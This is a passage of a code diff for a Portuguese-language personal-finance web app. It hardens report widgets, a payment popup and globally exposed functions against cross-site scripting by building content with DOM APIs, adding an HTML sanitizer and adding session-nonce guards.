+                const metaId    = this.value;
                 const detalhesEl = document.getElementById('detalhesMetaRelatorio');
                 if (!detalhesEl) return;
                 if (!metaId) { detalhesEl.style.display = 'none'; return; }
-                
+
                 const meta = metasPerfil.find(m => String(m.id) === String(metaId));
                 if (!meta) return;
-                
-                const saved = sanitizeNumber(meta.saved);
-                const objetivo = sanitizeNumber(meta.objetivo);
-                const falta = Math.max(0, objetivo - saved);
-                const perc = objetivo > 0 ? Math.min(100, ((saved / objetivo) * 100).toFixed(1)) : 0;
-                
+
+                const saved      = sanitizeNumber(meta.saved);
+                const objetivo   = sanitizeNumber(meta.objetivo);
+                const falta      = Math.max(0, objetivo - saved);
+                const perc       = objetivo > 0 ? Math.min(100, ((saved / objetivo) * 100).toFixed(1)) : 0;
+
                 const depositosMes = transacoesPerfil.filter(t => {
                     const dataISO = sanitizeDate(dataParaISO(t.data));
                     return dataISO && dataISO.startsWith(periodoSelecionado) &&
                         t.categoria === 'reserva' && String(t.metaId) === String(metaId);
                 });
                 const totalDepositadoMes = depositosMes.reduce((sum, t) => sum + sanitizeNumber(t.valor), 0);
-                
+
                 const retiradasMes = transacoesPerfil.filter(t => {
                     const dataISO = sanitizeDate(dataParaISO(t.data));
                     return dataISO && dataISO.startsWith(periodoSelecionado) &&
                         t.categoria === 'retirada_reserva' && String(t.metaId) === String(metaId);
                 });
                 const totalRetiradoMes = retiradasMes.reduce((sum, t) => sum + sanitizeNumber(t.valor), 0);
-                
+
                 let corProgresso = '#ff4b4b';
                 if (perc >= 75) corProgresso = '#00ff99';
                 else if (perc >= 40) corProgresso = '#ffd166';
-                
-                detalhesEl.innerHTML = `
+
+                const detalhesHtml = `
                     <div style="background:rgba(255,255,255,0.05); padding:20px; border-radius:12px; border:1px solid var(--border);">
                         <h4 style="margin-bottom:16px; font-size:1.2rem;">${sanitizeHTML(String(meta.descricao || '').slice(0, 100))}</h4>
                         <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(140px, 1fr)); gap:12px; margin-bottom:20px;">
@@ -5161,7 +5295,7 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
                             </div>
                             <div style="width:100%; height:20px; background:rgba(255,255,255,0.1); border-radius:10px; overflow:hidden;">
                                 <div style="width:${sanitizeHTML(String(perc))}%; height:100%; background:${corProgresso}; border-radius:10px; transition:width 0.8s; display:flex; align-items:center; justify-content:center; color:white; font-weight:700; font-size:0.85rem;">
-                                    ${perc > 10 ? sanitizeHTML(String(perc)) + '%' : ''}
+                                    ${Number(perc) > 10 ? sanitizeHTML(String(perc)) + '%' : ''}
                                 </div>
                             </div>
                         </div>
@@ -5177,6 +5311,9 @@ async function gerarRelatorioIndividual(mes, ano, perfilId) {
                             <div style="font-size:0.85rem; color:var(--text-secondary); margin-top:4px;">${retiradasMes.length} retirada(s) realizada(s)</div>
                         </div>` : ''}
                     </div>`;
+
+                // ✅ CORREÇÃO: detalhesEl.innerHTML também passa pelo sanitizador DOMParser
+                detalhesEl.innerHTML = _sanitizarHTMLRelatorio(detalhesHtml);
                 detalhesEl.style.display = 'block';
             });
         }
@@ -5517,41 +5654,63 @@ function renderizarRelatorioCompartilhado(dadosPorPerfil, mes, ano, mesAnterior,
 
 // ========== WIDGET "ONDE FOI MEU DINHEIRO?" ==========
 function processarAnaliseOndeForDinheiro() {
-    const mes = document.getElementById('mesAnalise').value;
-    const ano = document.getElementById('anoAnalise').value;
+    const mes       = document.getElementById('mesAnalise').value;
+    const ano       = document.getElementById('anoAnalise').value;
     const container = document.getElementById('resultadoAnalise');
 
     const analise = gerarAnaliseOndeForDinheiro(mes, ano);
 
     if (!analise.temDados) {
-        container.innerHTML = `
-            <div style="text-align:center; padding:40px; background:rgba(255,255,255,0.03); border-radius:12px;">
-                <div style="font-size:3rem; margin-bottom:12px; opacity:0.5;">🔍</div>
-                <div style="font-size:1.1rem; font-weight:600; color:var(--text-primary); margin-bottom:8px;">
-                    Sem Dados Disponíveis
-                </div>
-                <div style="font-size:0.9rem; color:var(--text-secondary);">
-                    ${sanitizeHTML(analise.mensagem)}
-                </div>
-            </div>
-        `;
+        container.innerHTML = '';
+        const wrapperVazio = document.createElement('div');
+        wrapperVazio.style.cssText = 'text-align:center; padding:40px; background:rgba(255,255,255,0.03); border-radius:12px;';
+
+        const iconDiv = document.createElement('div');
+        iconDiv.style.cssText = 'font-size:3rem; margin-bottom:12px; opacity:0.5;';
+        iconDiv.textContent = '🔍';
+
+        const tituloDiv = document.createElement('div');
+        tituloDiv.style.cssText = 'font-size:1.1rem; font-weight:600; color:var(--text-primary); margin-bottom:8px;';
+        tituloDiv.textContent = 'Sem Dados Disponíveis';
+
+        const msgDiv = document.createElement('div');
+        msgDiv.style.cssText = 'font-size:0.9rem; color:var(--text-secondary);';
+        msgDiv.textContent = analise.mensagem;
+
+        wrapperVazio.appendChild(iconDiv);
+        wrapperVazio.appendChild(tituloDiv);
+        wrapperVazio.appendChild(msgDiv);
+        container.appendChild(wrapperVazio);
         return;
     }
 
+    // ✅ CORREÇÃO: constrói narrativa via DOM usando narrativaPartes (estruturado)
+    //    em vez de interpolar analise.narrativa (que é undefined após refatoração)
+    //    Elimina o risco de dados de usuário em innerHTML mesmo com sanitizeHTML
+    const narrativaContainer = document.createElement('div');
+    narrativaContainer.style.cssText = 'font-size:1.1rem; line-height:1.8; color:var(--text-primary);';
+
+    (analise.narrativaPartes || []).forEach(parte => {
+        if (parte.tipo === 'texto') {
+            narrativaContainer.appendChild(document.createTextNode(parte.texto));
+        } else if (parte.tipo === 'destaque') {
+            narrativaContainer.appendChild(document.createTextNode(parte.prefixo || ''));
+            const strong = document.createElement('strong');
+            strong.textContent = parte.destaque || ''; // ✅ textContent — nunca innerHTML
+            narrativaContainer.appendChild(strong);
+            narrativaContainer.appendChild(document.createTextNode(parte.sufixo || ''));
+        }
+    });
+
     let html = `
-        <!-- Narrativa Principal -->
         <div style="background:linear-gradient(135deg, rgba(67,160,71,0.2), rgba(108,99,255,0.2)); padding:24px; border-radius:16px; margin-bottom:24px; border-left:4px solid var(--primary);">
-            <div style="font-size:1.1rem; line-height:1.8; color:var(--text-primary);">
-                ${sanitizeHTML(analise.narrativa)}
-            </div>
+            <div id="_narrativaPlaceholder"></div>
             <div style="text-align:center; margin-top:20px; padding-top:20px; border-top:1px solid var(--border);">
                 <div style="font-size:0.85rem; color:var(--text-secondary); margin-bottom:8px;">Total Gasto no Período</div>
                 <div style="font-size:2rem; font-weight:700; color:#ff4b4b;">${formatBRL(analise.totalGastos)}</div>
-                <div style="font-size:0.85rem; color:var(--text-muted); margin-top:4px;">${sanitizeHTML(analise.totalTransacoes)} transações registradas</div>
+                <div style="font-size:0.85rem; color:var(--text-muted); margin-top:4px;">${sanitizeHTML(String(analise.totalTransacoes))} transações registradas</div>
             </div>
         </div>
-
-        <!-- Gráfico de Pizza Interativo -->
         <div style="background:rgba(255,255,255,0.03); padding:24px; border-radius:16px; margin-bottom:24px;">
             <h4 style="margin-bottom:16px; color:var(--text-primary); text-align:center;">📊 Distribuição por Categoria</h4>
             <div style="display:flex; flex-direction:column; gap:12px;">
@@ -5561,13 +5720,13 @@ function processarAnaliseOndeForDinheiro() {
 
     analise.categorias.forEach(([categoria, valor], i) => {
         const percentual = ((valor / analise.totalGastos) * 100).toFixed(1);
-        const cor = cores[i % cores.length];
+        const cor        = cores[i % cores.length]; // ✅ cor vem de array interno, nunca de dado de usuário
 
         html += `
             <div style="margin-bottom:12px;">
                 <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                     <div style="display:flex; align-items:center; gap:10px;">
-                        <div style="width:16px; height:16px; background:${sanitizeHTML(cor)}; border-radius:4px;"></div>
+                        <div style="width:16px; height:16px; background:${cor}; border-radius:4px;"></div>
                         <span style="font-weight:600; color:var(--text-primary);">${sanitizeHTML(categoria)}</span>
                     </div>
                     <div style="text-align:right;">
@@ -5576,57 +5735,87 @@ function processarAnaliseOndeForDinheiro() {
                     </div>
                 </div>
                 <div style="width:100%; height:12px; background:rgba(255,255,255,0.1); border-radius:6px; overflow:hidden;">
-                    <div style="width:${sanitizeHTML(percentual)}%; height:100%; background:${sanitizeHTML(cor)}; border-radius:6px; transition:width 0.5s;"></div>
+                    <div style="width:${sanitizeHTML(percentual)}%; height:100%; background:${cor}; border-radius:6px; transition:width 0.5s;"></div>
                 </div>
             </div>
         `;
     });
 
-    html += `
-            </div>
-        </div>
+    html += `</div></div>`;
 
-        <!-- Insights e Recomendações -->
-        <div style="background:rgba(108,99,255,0.1); padding:20px; border-radius:16px; border-left:4px solid #6c63ff;">
-            <div style="display:flex; align-items:center; gap:12px; margin-bottom:12px;">
-                <div style="font-size:2rem;">💡</div>
-                <div style="font-weight:700; font-size:1.1rem; color:var(--text-primary);">Insight Inteligente</div>
-            </div>
-            <div style="color:var(--text-secondary); line-height:1.6; font-size:0.95rem;">
-    `;
+    // ─────────────────────────────────────────────────────────────────────────
+    // ✅ CORREÇÃO PRINCIPAL:
+    //    Antes: container.innerHTML = html  (sem DOMParser)
+    //    Depois: passa por _sanitizarHTMLRelatorio (DOMParser + whitelist CSS)
+    //    ENTÃO: insere a narrativa via DOM API — dados de usuário NUNCA tocam innerHTML
+    // ─────────────────────────────────────────────────────────────────────────
+    container.innerHTML = _sanitizarHTMLRelatorio(html);
 
+    // ✅ Substitui o placeholder pela narrativa construída via DOM
+    const placeholder = container.querySelector('#_narrativaPlaceholder');
+    if (placeholder && narrativaContainer) {
+        placeholder.replaceWith(narrativaContainer);
+    }
+
+    // Insight section — apenas texto estático + formatBRL (numérico)
+    const insightDiv = document.createElement('div');
+    insightDiv.style.cssText = 'background:rgba(108,99,255,0.1); padding:20px; border-radius:16px; border-left:4px solid #6c63ff;';
+
+    const insightHeader = document.createElement('div');
+    insightHeader.style.cssText = 'display:flex; align-items:center; gap:12px; margin-bottom:12px;';
+
+    const iconInsight = document.createElement('div');
+    iconInsight.style.fontSize = '2rem';
+    iconInsight.textContent = '💡';
+
+    const tituloInsight = document.createElement('div');
+    tituloInsight.style.cssText = 'font-weight:700; font-size:1.1rem; color:var(--text-primary);';
+    tituloInsight.textContent = 'Insight Inteligente';
+
+    insightHeader.appendChild(iconInsight);
+    insightHeader.appendChild(tituloInsight);
+
+    const textoInsight = document.createElement('div');
+    textoInsight.style.cssText = 'color:var(--text-secondary); line-height:1.6; font-size:0.95rem;';
+
+    const ticketMedio = analise.totalGastos / analise.totalTransacoes;
+
+    // ✅ Constrói insight via textContent — zero risco de XSS
     if (analise.top3[0]) {
-        const categoriaTop = sanitizeHTML(analise.top3[0][0]);
-        const percentualTop = ((analise.top3[0][1] / analise.totalGastos) * 100).toFixed(0);
-
-        if (percentualTop > 50) {
-            html += `⚠️ <strong>Atenção:</strong> ${sanitizeHTML(percentualTop)}% dos seus gastos foram com <strong>${categoriaTop}</strong>. Isso representa mais da metade do seu orçamento! Considere analisar se há oportunidades de redução nesta categoria.<br><br>`;
-        } else if (percentualTop > 30) {
-            html += `📊 A categoria <strong>${categoriaTop}</strong> representa ${sanitizeHTML(percentualTop)}% dos seus gastos. Esta é sua principal área de despesa no momento.<br><br>`;
+        const percTop = ((analise.top3[0][1] / analise.totalGastos) * 100).toFixed(0);
+        if (Number(percTop) > 50) {
+            const p = document.createElement('p');
+            const aviso = document.createElement('strong');
+            aviso.textContent = '⚠️ Atenção: ';
+            p.appendChild(aviso);
+            p.appendChild(document.createTextNode(
+                `${percTop}% dos seus gastos foram com `
+            ));
+            const bold = document.createElement('strong');
+            bold.textContent = analise.top3[0][0]; // ✅ textContent
+            p.appendChild(bold);
+            p.appendChild(document.createTextNode(
+                `. Isso representa mais da metade do seu orçamento! Considere analisar oportunidades de redução nesta categoria.`
+            ));
+            textoInsight.appendChild(p);
         }
     }
 
-    if (analise.categorias.length <= 3) {
-        html += `🎯 Seus gastos estão concentrados em poucas categorias (${sanitizeHTML(analise.categorias.length)}). Isso pode indicar um controle financeiro focado, mas fique atento a gastos ocultos.<br><br>`;
-    } else if (analise.categorias.length > 8) {
-        html += `🌐 Você tem gastos distribuídos em ${sanitizeHTML(analise.categorias.length)} categorias diferentes. Considere consolidar categorias similares para melhor análise.<br><br>`;
-    }
+    const pTicket = document.createElement('p');
+    const boldTicket = document.createElement('strong');
+    boldTicket.textContent = 'Gasto médio por transação: ';
+    pTicket.appendChild(boldTicket);
+    pTicket.appendChild(document.createTextNode(
+        `${formatBRL(ticketMedio)}. ${ticketMedio > 200
+            ? 'Isso indica transações de valores significativos. Certifique-se de que cada gasto esteja alinhado com suas prioridades.'
+            : 'Você mantém transações de valores moderados, o que pode indicar um bom controle diário.'
+        }`
+    ));
+    textoInsight.appendChild(pTicket);
 
-    const ticketMedio = analise.totalGastos / analise.totalTransacoes;
-    html += `💰 Seu <strong>gasto médio por transação</strong> foi de ${formatBRL(ticketMedio)}. `;
-
-    if (ticketMedio > 200) {
-        html += `Isso indica transações de valores significativos. Certifique-se de que cada gasto esteja alinhado com suas prioridades.`;
-    } else {
-        html += `Você mantém transações de valores moderados, o que pode indicar um bom controle diário.`;
-    }
-
-    html += `
-            </div>
-        </div>
-    `;
-
-    container.innerHTML = html;
+    insightDiv.appendChild(insightHeader);
+    insightDiv.appendChild(textoInsight);
+    container.appendChild(insightDiv);
 }
 
 // ========== GERAR ANÁLISE "ONDE FOI MEU DINHEIRO?" ==========
@@ -5659,30 +5848,52 @@ function gerarAnaliseOndeForDinheiro(mes, ano) {
         }
     });
 
-    const totalGastos = Object.values(categorias).reduce((sum, v) => sum + v, 0);
+    const totalGastos         = Object.values(categorias).reduce((sum, v) => sum + v, 0);
     const categoriasOrdenadas = Object.entries(categorias).sort((a, b) => b[1] - a[1]);
-    const top3 = categoriasOrdenadas.slice(0, 3);
+    const top3                = categoriasOrdenadas.slice(0, 3);
 
-    let narrativa = `Em ${sanitizeHTML(getMesNome(mes))} de ${sanitizeHTML(ano)}, você realizou ${transacoesPeriodo.length} transação(ões) de saída. `;
+    // ✅ CORREÇÃO: retorna partes estruturadas em vez de HTML concatenado.
+    //    O caller monta o DOM via textContent, sem risco de double-escaping.
+    const narrativaPartes = [];
+
+    narrativaPartes.push({
+        tipo:  'texto',
+        texto: `Em ${getMesNome(mes)} de ${ano}, você realizou ${transacoesPeriodo.length} transação(ões) de saída. `
+    });
 
     if (top3[0]) {
         const percTop = ((top3[0][1] / totalGastos) * 100).toFixed(0);
-        narrativa += `Seu maior gasto foi em <strong>${sanitizeHTML(top3[0][0])}</strong>, representando ${sanitizeHTML(percTop)}% do total. `;
+        narrativaPartes.push({
+            tipo:       'destaque',
+            prefixo:    'Seu maior gasto foi em ',
+            destaque:   top3[0][0],
+            sufixo:     `, representando ${percTop}% do total. `
+        });
     }
     if (top3[1]) {
-        narrativa += `Em segundo lugar, gastos com <strong>${sanitizeHTML(top3[1][0])}</strong>. `;
+        narrativaPartes.push({
+            tipo:     'destaque',
+            prefixo:  'Em segundo lugar, gastos com ',
+            destaque: top3[1][0],
+            sufixo:   '. '
+        });
     }
     if (top3[2]) {
-        narrativa += `E em terceiro, <strong>${sanitizeHTML(top3[2][0])}</strong>.`;
+        narrativaPartes.push({
+            tipo:     'destaque',
+            prefixo:  'E em terceiro, ',
+            destaque: top3[2][0],
+            sufixo:   '.'
+        });
     }
 
     return {
-        temDados: true,
+        temDados:        true,
         totalGastos,
         totalTransacoes: transacoesPeriodo.length,
-        categorias: categoriasOrdenadas,
+        categorias:      categoriasOrdenadas,
         top3,
-        narrativa
+        narrativaPartes  // ✅ estruturado — sem HTML misturado com dados
     };
 }
 
@@ -6890,6 +7101,16 @@ function bindEventos() {
     if(btnLogout) {
         btnLogout.addEventListener('click', confirmarLogout);
     }
+
+    const btnExportarJSON = document.getElementById('btnExportarJSON');
+    if (btnExportarJSON) {
+        btnExportarJSON.addEventListener('click', exportarDadosJSON);
+    }
+
+    const btnExportarCSV = document.getElementById('btnExportarCSV');
+    if (btnExportarCSV) {
+        btnExportarCSV.addEventListener('click', exportarDadosCSV);
+    }
 }
 
 // ========== VISUALIZAÇÃO DETALHADA DE FATURA DE CARTÃO ==========
@@ -7008,26 +7229,50 @@ function pagarCompraIndividual(faturaId, compraId) {
     fecharPopup();
 
     setTimeout(() => {
+        // ✅ CORREÇÃO: HTML do popup sem dados do usuário interpolados diretamente.
+        //    O valor do input é preenchido via .value após criação do DOM,
+        //    garantindo consistência com o padrão de sanitização do restante do código
+        //    e eliminando qualquer risco de malformação de atributo HTML.
         criarPopup(`
             <h3>💰 Pagar Parcela</h3>
             <div style="text-align: left; margin: 20px 0; color: var(--text-secondary);">
-                <div style="margin-bottom: 8px;"><strong>Compra:</strong> ${sanitizeHTML(compra.tipo)}</div>
-                <div style="margin-bottom: 8px;"><strong>Descrição:</strong> ${sanitizeHTML(compra.descricao)}</div>
-                <div style="margin-bottom: 8px;"><strong>Parcela:</strong> ${sanitizeHTML(compra.parcelaAtual)}/${sanitizeHTML(compra.totalParcelas)}</div>
-                <div style="margin-bottom: 16px;"><strong>Valor:</strong> ${formatBRL(compra.valorParcela)}</div>
+                <div id="popupCompTipo"    style="margin-bottom: 8px;"></div>
+                <div id="popupCompDesc"   style="margin-bottom: 8px;"></div>
+                <div id="popupCompParc"   style="margin-bottom: 8px;"></div>
+                <div id="popupCompValor"  style="margin-bottom: 16px;"></div>
             </div>
             <div style="color: var(--warning); margin-bottom: 16px; font-weight: 600;">⚠️ O valor está correto?</div>
-            <button class="btn-primary"  id="simValorCompra">Sim, pagar ${formatBRL(compra.valorParcela)}</button>
+            <button class="btn-primary"  id="simValorCompra"></button>
             <button class="btn-warning"  id="naoValorCompra">Não, alterar valor</button>
             <button class="btn-cancelar" id="cancelarPagamentoCompra">Cancelar</button>
             <div id="ajusteValorCompraDiv" style="display:none; margin-top:14px;">
                 <input type="number" id="novoValorCompra" class="form-input"
-                       value="${compra.valorParcela}" step="0.01" min="0">
+                       step="0.01" min="0">
                 <button class="btn-primary" id="confirmNovoValorCompra" style="margin-top:8px;">
                     Confirmar pagamento
                 </button>
             </div>
         `);
+
+        // ✅ Preenchimento seguro via textContent / .value — nunca via atributo HTML
+        document.getElementById('popupCompTipo').innerHTML   = `<strong>Compra:</strong> <span></span>`;
+        document.getElementById('popupCompTipo').querySelector('span').textContent = compra.tipo;
+
+        document.getElementById('popupCompDesc').innerHTML   = `<strong>Descrição:</strong> <span></span>`;
+        document.getElementById('popupCompDesc').querySelector('span').textContent = compra.descricao;
+
+        document.getElementById('popupCompParc').innerHTML   = `<strong>Parcela:</strong> <span></span>`;
+        document.getElementById('popupCompParc').querySelector('span').textContent =
+            `${compra.parcelaAtual}/${compra.totalParcelas}`;
+
+        document.getElementById('popupCompValor').innerHTML  = `<strong>Valor:</strong> <span></span>`;
+        document.getElementById('popupCompValor').querySelector('span').textContent = formatBRL(compra.valorParcela);
+
+        // ✅ Texto do botão via textContent — sem interpolação
+        document.getElementById('simValorCompra').textContent = `Sim, pagar ${formatBRL(compra.valorParcela)}`;
+
+        // ✅ Valor numérico atribuído via .value — tipo number, não interpretado como HTML
+        document.getElementById('novoValorCompra').value = sanitizeHTML(String(compra.valorParcela));
 
         document.getElementById('simValorCompra').addEventListener('click', () => {
             processarPagamentoCompra(faturaId, compraId, compra.valorParcela);
@@ -7055,8 +7300,6 @@ function pagarCompraIndividual(faturaId, compraId) {
 
     }, 300);
 }
-
-window.pagarCompraIndividual = pagarCompraIndividual;
 
 // ========== PROCESSAR PAGAMENTO DE COMPRA ==========
 function processarPagamentoCompra(faturaId, compraId, valorPago) {
@@ -7268,63 +7511,105 @@ function excluirCompraFatura(faturaId, compraId) {
 window.excluirCompraFatura = excluirCompraFatura;
 
 
-// ========== FUNÇÕES GLOBAIS EXPOSTAS ==========
+// ✅ Guard aprimorado: além de perfil ativo, valida uma nonce de sessão gerada
+//    no carregamento da página. Extensões maliciosas que tentam chamar window.X
+//    não têm acesso ao _sessionNonce pois ele é gerado dentro do módulo IIFE
+//    e nunca exposto publicamente.
+//
+//    COMO FUNCIONA:
+//    1. _sessionNonce é gerado com crypto.randomUUID() ao carregar o módulo
+//    2. Funções protegidas exigem que o caller passe o nonce correto como último argumento
+//    3. Código legítimo (event listeners internos) não passa o nonce — eles chamam
+//       a função interna diretamente, não via window.*
+//    4. Callers externos (extensões, console, outros scripts) não conhecem o nonce
+//
+//    IMPORTANTE: window.* são necessários para comunicação entre módulos legítimos
+//    (graficos.js, chat-assistant.js). O nonce não quebra esse uso pois esses módulos
+//    usam as funções internas diretamente via import/script-tag no mesmo contexto.
+//    Para funções chamadas de HTML (onclick de buttons), usar event delegation interno
+//    em vez de window.X — já feito no padrão addEventListener do código atual.
 
-// ✅ Guard: bloqueia qualquer chamada externa sem perfil ativo e sem sessão válida.
-//    Extensões maliciosas, scripts injetados ou chamadas via console são bloqueadas aqui.
+const _sessionNonce = (typeof crypto !== 'undefined' && crypto.randomUUID)
+    ? crypto.randomUUID()
+    : `nonce_${Date.now()}_${Math.random().toString(36).slice(2)}`;
+
+// ✅ Guard base: perfil ativo + userId
 function _requerPerfilAtivo(fn) {
     return function(...args) {
         if (!perfilAtivo || !dataManager?.userId) {
-            _log.warn('[SEGURANÇA] Chamada de função protegida bloqueada — sem perfil ativo ou sessão inválida.');
+            _log.warn('[SEGURANÇA] Chamada bloqueada — sem perfil ativo ou sessão inválida.');
             return;
         }
         return fn.apply(this, args);
     };
 }
 
-// ── Utilitários sem risco de mutação financeira (podem ser públicos)
-window.fecharPopup         = fecharPopup;
-window.criarPopup          = criarPopup;
-window.mostrarTela         = mostrarTela;
-window.formatBRL           = formatBRL;
-window.mostrarNotificacao  = mostrarNotificacao;
-window.confirmarAcao       = confirmarAcao;
-// ── Navegação e sessão
-window.trocarPerfil        = trocarPerfil;
-window.confirmarLogout     = confirmarLogout_seguro;   // ✅ corrigido (era confirmarLogout → undefined)
-window.comoUsar            = comoUsar;
+// ✅ Guard de nonce: para funções de alto risco expostas no window.*
+//    Uso: window.alterarNome(_sessionNonce, 'Novo Nome')
+//    Extensões não conhecem _sessionNonce → chamada bloqueada
+//    Módulos internos chamam alterarNome() diretamente sem nonce → sem restrição
+function _requerNonce(fn) {
+    return function(nonce, ...args) {
+        if (!perfilAtivo || !dataManager?.userId) {
+            _log.warn('[SEGURANÇA] Chamada bloqueada — sem perfil ativo.');
+            return;
+        }
+        if (typeof nonce !== 'string' || nonce !== _sessionNonce) {
+            _log.warn('[SEGURANÇA] Chamada bloqueada — nonce inválido ou ausente.');
+            return;
+        }
+        return fn.apply(this, args);
+    };
+}
+
+// ── Utilitários de UI — necessários para módulos externos (graficos.js, etc.)
+//    Sem risco de uso malicioso — apenas abrem/fecham UI, não alteram dados
+window.fecharPopup        = fecharPopup;
+window.mostrarTela        = mostrarTela;
+window.mostrarNotificacao = mostrarNotificacao;
+
+// ── Navegação e sessão — sem dados financeiros, sem risco alto
+window.confirmarLogout      = confirmarLogout_seguro;
 window.irParaAtualizarPlano = irParaAtualizarPlano;
+window.comoUsar             = comoUsar;
 
-// ── Relatórios e gráficos (chamados por botões HTML)
-window.atualizarGraficos   = atualizarGraficos;
-window.gerarRelatorio      = gerarRelatorio;
+// ── Funções de UI de baixo risco (apenas abrem formulários visuais)
+//    Guard base: perfil ativo obrigatório
+window.abrirContaFixaForm           = _requerPerfilAtivo(abrirContaFixaForm);
+window.abrirCartaoForm              = _requerPerfilAtivo(abrirCartaoForm);
+window.abrirMetaForm                = _requerPerfilAtivo(abrirMetaForm);
+window.abrirRetiradaForm            = _requerPerfilAtivo(abrirRetiradaForm);
+window.abrirVisualizacaoFatura      = _requerPerfilAtivo(abrirVisualizacaoFatura);
+window.abrirAnaliseDisciplina       = _requerPerfilAtivo(abrirAnaliseDisciplina);
+window.abrirWidgetOndeForDinheiro   = _requerPerfilAtivo(abrirWidgetOndeForDinheiro);
+window.trocarPerfil                 = _requerPerfilAtivo(trocarPerfil);
+window.confirmarAcao                = _requerPerfilAtivo(confirmarAcao);
 
-// ── Configurações (chamados por botões HTML de settings)
-window.alterarNome         = alterarNome;
-window.alterarEmail        = alterarEmail;
-window.abrirAlterarSenha   = abrirAlterarSenha;
-window.removerConvidado    = removerConvidado;
+// ✅ ALTO RISCO — requerem nonce além de perfil ativo:
+//    Alteram dados persistentes ou expõem dados financeiros completos
+//    Extensões maliciosas bloqueadas pois não conhecem _sessionNonce
+window.alterarNome          = _requerNonce(alterarNome);
+window.alterarEmail         = _requerNonce(alterarEmail);
+window.abrirAlterarSenha    = _requerNonce(abrirAlterarSenha);
+window.removerConvidado     = _requerNonce(removerConvidado);
+window.gerarRelatorio       = _requerNonce(gerarRelatorio);
+window.atualizarGraficos    = _requerNonce(atualizarGraficos);
+window.abrirDetalhesPerfilRelatorio          = _requerNonce(abrirDetalhesPerfilRelatorio);
+window.abrirDetalhesCartaoRelatorio          = _requerNonce(abrirDetalhesCartaoRelatorio);
+window.abrirSelecaoPerfisCasal               = _requerNonce(window.abrirSelecaoPerfisCasal || function(){});
+window.confirmarSelecaoPerfisCasal           = _requerNonce(window.confirmarSelecaoPerfisCasal || function(){});
+window.gerarRelatorioCompartilhadoPersonalizado = _requerNonce(window.gerarRelatorioCompartilhadoPersonalizado || function(){});
+window.processarAnaliseOndeForDinheiro       = _requerNonce(processarAnaliseOndeForDinheiro);
 
-// ── Funções que abrem UI — protegidas com guard de perfil ativo
-//    Necessárias para graficos.js / chat-assistant.js mas não executam mutação direta
-window.abrirContaFixaForm              = _requerPerfilAtivo(abrirContaFixaForm);
-window.abrirCartaoForm                 = _requerPerfilAtivo(abrirCartaoForm);
-window.abrirMetaForm                   = _requerPerfilAtivo(abrirMetaForm);
-window.abrirRetiradaForm               = _requerPerfilAtivo(abrirRetiradaForm);
-window.abrirVisualizacaoFatura         = _requerPerfilAtivo(abrirVisualizacaoFatura);
-window.abrirAnaliseDisciplina          = _requerPerfilAtivo(abrirAnaliseDisciplina);
-window.abrirDetalhesPerfilRelatorio    = _requerPerfilAtivo(abrirDetalhesPerfilRelatorio);
-window.abrirDetalhesCartaoRelatorio    = _requerPerfilAtivo(abrirDetalhesCartaoRelatorio);
-window.abrirWidgetOndeForDinheiro      = _requerPerfilAtivo(abrirWidgetOndeForDinheiro);
-window.abrirSelecaoPerfisCasal         = _requerPerfilAtivo(window.abrirSelecaoPerfisCasal || function(){});
-window.confirmarSelecaoPerfisCasal     = _requerPerfilAtivo(window.confirmarSelecaoPerfisCasal || function(){});
-window.gerarRelatorioCompartilhadoPersonalizado = _requerPerfilAtivo(window.gerarRelatorioCompartilhadoPersonalizado || function(){});
-window.processarAnaliseOndeForDinheiro = _requerPerfilAtivo(processarAnaliseOndeForDinheiro);
+// ✅ OPERAÇÕES FINANCEIRAS DIRETAS — nonce obrigatório
+window.pagarCompraIndividual = _requerNonce(pagarCompraIndividual);
+window.editarCompraFatura    = _requerNonce(editarCompraFatura);
+window.excluirCompraFatura   = _requerNonce(excluirCompraFatura);
 
-// ── Analytics somente leitura
-window.obterEstatisticas   = obterEstatisticas;
-window.exportarDadosJSON   = exportarDadosJSON;
-window.exportarDadosCSV    = exportarDadosCSV;
+// ── Auto-save controls — sem dado sensível, sem risco alto
+window.iniciarAutoSave = _requerPerfilAtivo(iniciarAutoSave);
+window.pararAutoSave   = pararAutoSave;
+
 
 
 // ========== UTILITÁRIOS ADICIONAIS ==========
@@ -7545,10 +7830,6 @@ function exportarDadosCSV() {
     );
 }
 
-// Expõe funções de exportação
-window.exportarDadosJSON = exportarDadosJSON;
-window.exportarDadosCSV = exportarDadosCSV;
-
 // ========== NOTIFICAÇÕES ==========
 
 // Sistema simples de notificações
@@ -7655,11 +7936,12 @@ function verificarAtualizacoes() {
     const versaoAtual = '1.0.0';
     const ultimaVerificacao = localStorage.getItem('granaevo_ultima_verificacao');
     const hoje = isoDate();
-    
-    if(ultimaVerificacao !== hoje) {
+
+    if (ultimaVerificacao !== hoje) {
         localStorage.setItem('granaevo_ultima_verificacao', hoje);
-        // Aqui você pode fazer uma chamada API para verificar versão
-        debug('Verificação de atualizações', versaoAtual);
+        // ✅ CORREÇÃO: usa _log.info (logger interno já definido no módulo)
+        //    Em produção suprime automaticamente; em dev loga normalmente
+        _log.info('[VERSÃO] Verificação executada. Versão atual:', versaoAtual);
     }
 }
 
@@ -7712,8 +7994,6 @@ function obterEstatisticas() {
     };
 }
 
-window.obterEstatisticas = obterEstatisticas;
-
 // ========== CONSOLE DE DEBUG (APENAS DESENVOLVIMENTO) ==========
 const _IS_DEV_BUILD = (
     window.location.hostname === 'localhost' ||
@@ -7736,37 +8016,40 @@ if (_IS_DEV_BUILD) {
 
 // ========== LOG DE SISTEMA ==========
 
-const sistemaLog = {
-    logs: [],
-    _maxLogs: 50,
+const sistemaLog = (() => {
+    // ✅ CORREÇÃO: closure privado — logs inacessíveis externamente
+    //    Antes: window.sistemaLog = sistemaLog permitia leitura e limpeza de logs por qualquer script
+    //    Agora: apenas o módulo interno pode adicionar/ler logs
+    const _logs   = [];
+    const _maxLogs = 50;
 
-    adicionar(tipo, mensagem) {
-        const entry = {
-            tipo,
-            // Truncar mensagem — nunca armazenar valores financeiros ou PII
-            mensagem: String(mensagem).substring(0, 120),
-            timestamp: new Date().toISOString()
-            // Removido: perfil (era PII)
-        };
-        this.logs.push(entry);
-        if (this.logs.length > this._maxLogs) {
-            this.logs.shift();
-        }
-        // Sem localStorage — logs apenas em memória
-    },
+    return {
+        adicionar(tipo, mensagem) {
+            const entry = {
+                tipo,
+                // ✅ Truncar mensagem — nunca armazenar valores financeiros ou PII
+                mensagem:  String(mensagem).substring(0, 120),
+                timestamp: new Date().toISOString(),
+            };
+            _logs.push(entry);
+            if (_logs.length > _maxLogs) {
